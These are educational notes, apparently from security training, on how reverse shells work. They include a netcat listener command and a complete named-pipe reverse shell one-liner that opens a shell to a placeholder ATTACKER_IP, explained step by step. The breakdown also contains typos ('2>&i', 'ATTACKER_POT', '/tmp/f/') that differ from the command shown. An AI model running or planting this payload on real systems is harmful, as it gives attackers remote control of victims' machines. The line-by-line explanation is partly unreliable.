
### Reverse Shells
----------
Referred to as a `connect back shell`. 
- One of the most popular techniques for `gaining access to a system in cyberattacks`.
- Initiate from the target system to the attacker's machine
- Helps `avoid detection from network firewalls and other security appliances.`


#### How do they work?
---------
A reverse shell will connect back to the attacker's machine.
- Will be waiting for a connection.
- Use netcat to listen to a connection using 
- `nc -lvnp 443`

**What are these arguments?**
- `l` - indicates to listen / wait for a connection
- `-v` - enables verbose mode
- `-n` prevents connections from using DNS for lookup (will not resolve any hostname it will use an IP address)
- -`p` indicates the port that will be used to wait for the connection

**Note:** 
- Any port can be used to wait for a connection.
- Attackers / Pentesters tend to use known ports.

**Why do they use well known ports?**
- To blend in with legitimate traffic.


### Gaining Reverse Shell Access
--------------
**Once the listener is set**, `attacker should execute what is known as a reverse shell payload.`
- Usually abuses a vulnerability or unauthorized access granted by the attacker
- Executes a command that will expose the shell through the network.
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


#### Example: Pipe Reverse Shell
------------------------
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`


- `rm -f /tmp/f`: Removes any existing pipe file located at `/tmp/f/`
	- Ensures the script can create a new named pipe without conflicts

- `mkfifo /tmp/f`: Creates a named pipe (FIFO) at `/tmp/f/`.
	- Named piped allow for two-way communication `between processes`.
	- In this case, acts as a channel for input / output

- `cat /tmp/f` : Reads data from the named pipe, waits for input that can be sent through the pipe

- `| bash -i 2>&i`: The output of cat is piped to a shell instance (bash -i) 
	- Allows the attacker to execute commands interactively
	- `2>&i` redirects standard error to standard output, ensuring that error messages are seen by the attacker

- `| nc ATTACKER_IP ATTACKER_POT >/tmp/f/` - Pipes the shell's output through NC to the attacker IP address on the ATTACKER port
- `>/tmp/f/` - Final part sends the output of the commands back into the named pipe, allowing for bi directional communication

**Note:** This payload can expose the shell bash through the network to the desired listener.

